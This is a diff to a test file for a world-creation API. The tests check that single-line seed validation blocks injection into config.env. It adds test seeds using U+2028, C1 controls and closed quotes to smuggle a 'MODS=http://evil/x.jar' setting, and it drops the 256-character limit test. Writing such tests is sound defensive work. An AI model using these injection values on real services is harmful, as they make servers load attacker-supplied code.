@@ -44,7 +44,14 @@ describe('POST /api/worlds seed must be a single line (#726)', () => {
     'x\rMODS=http://evil/x.jar',
     'x\u0000y',
     'x\u001by',
-  ])('rejects seed %j with 400 and leaves config.env alone', async (seed) => {
+    // U+2028 and C1 controls used to pass the schema, so the world was
+    // created and LEVEL changed before the SEED write failed
+    'x\u2028MODS=x',
+    'x\u0085MODS=x',
+    // Compose closes the quote and reads MODS as another setting
+    '"" MODS=http://evil/x.jar',
+    "'' MODS=http://evil/x.jar",
+  ])('rejects seed %j with 400 and leaves config.env and worlds alone', async (seed) => {
     const response = await app.inject({
       method: 'POST',
       url: '/api/worlds',
@@ -56,17 +63,7 @@ describe('POST /api/worlds seed must be a single line (#726)', () => {
     expect(existsSync(join(TEST_PLATFORM_PATH, 'worlds', 'new-world'))).toBe(false);
   });
 
-  it('rejects a seed longer than 256 characters', async () => {
-    const response = await app.inject({
-      method: 'POST',
-      url: '/api/worlds',
-      payload: { name: 'new-world', seed: 'x'.repeat(257) },
-    });
-
-    expect(response.statusCode).toBe(400);
-  });
-
-  it.each(['-9223372036854775808', 'a text seed with spaces, commas & symbols!'])(
+  it.each(['-9223372036854775808', 'a text seed with spaces, commas & symbols!', 'x'.repeat(300)])(
     'accepts seed %j',
     async (seed) => {
       const response = await app.inject({
